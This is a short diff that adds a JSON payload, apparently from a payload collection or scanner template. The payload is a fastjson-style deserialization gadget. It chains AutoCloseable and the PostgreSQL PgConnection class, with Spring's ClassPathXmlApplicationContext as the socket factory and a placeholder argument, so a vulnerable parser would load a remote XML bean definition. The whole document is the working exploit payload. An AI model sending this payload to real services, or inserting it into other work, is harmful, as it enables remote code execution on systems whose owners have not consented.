@@ -1,0 +1,18 @@
+{
+  "x1":{
+    "@type": "java.lang.AutoCloseable",
+    "@type": "org.postgresql.jdbc.PgConnection",
+    "hostSpecs": [
+      {
+        "host": "127.0.0.1",
+        "port": 2333
+      }
+    ],
+    "user": "user",
+    "database": "test",
+    "info": {
+      "socketFactory": "org.springframework.context.support.ClassPathXmlApplicationContext",
+      "socketFactoryArg": "%1$s"
+    },url: ""
+  }
+}
